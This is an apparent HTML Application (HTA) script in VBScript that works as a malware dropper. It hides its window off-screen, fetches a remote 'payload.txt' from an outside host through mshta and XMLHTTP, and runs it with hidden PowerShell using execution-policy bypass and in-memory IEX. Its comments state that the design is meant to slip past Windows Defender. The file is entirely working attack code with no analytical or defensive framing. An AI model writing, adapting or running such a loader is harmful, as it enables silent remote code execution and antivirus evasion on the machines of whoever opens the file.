<script language="VBScript">
window.resizeTo 0,0:window.moveTo -2000,-2000
On Error Resume Next

Dim sh : Set sh = CreateObject("WScript.Shell")

' This downloads the real payload from a second URL, Base64 decodes it, and runs it in memory.
' Defender sees a harmless script that just downloads a text file, not the malicious code.
sh.Run "mshta.exe " & Chr(34) & "javascript:var x=new ActiveXObject('MSXML2.XMLHTTP'); x.open('GET','https://dicerigx.app/payload.txt', false); x.send(); var s=new ActiveXObject('WScript.Shell'); s.Run('powershell -NoP -Exec Bypass -WindowStyle Hidden -Command ""IEX ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(''' + btoa(x.responseText) + ''')))""', 0, false); close();" & Chr(34), 0, False

window.close()
</script>
